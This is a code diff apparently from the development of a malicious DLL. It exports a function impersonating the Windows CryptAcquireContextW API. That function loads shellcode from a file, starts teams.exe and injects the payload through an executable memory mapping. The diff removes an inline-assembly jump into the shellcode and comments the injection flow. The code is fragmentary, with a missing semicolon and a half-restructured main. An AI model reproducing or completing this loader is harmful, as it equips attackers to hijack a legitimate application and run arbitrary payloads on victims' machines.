@@ -150,9 +150,8 @@ void execute_Teams() {
     system("teams.exe");
 }
 
-// Your main function or other parts of the program...
-int main() {
-    // TODO: Finish main statement
+// Extern function that gets exported. Function seemed to work better when compiled as extern.
+extern "C" {
     
     __declspec(dllexport) void CryptAcquireContextW() {
         char payload[PSIZE];
@@ -167,7 +166,8 @@ int main() {
         };
 
             /*
-            OLD CODE
+            OLD CODE. Did not include checks and such. Also permissions weren't working.
+
             if (get_shellcode_from_file(payload, PAYLOAD_PATH) == 0) {
             execute_Teams();
             HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(payload), NULL);
@@ -180,15 +180,6 @@ int main() {
 
         // Inject process
         mapinject()
-
-
-        // Execute shellcode
-        __asm
-        {
-            mov eax, lpMapAddress
-            push eax;
-            ret
-        }
     }
     return 0;
 }
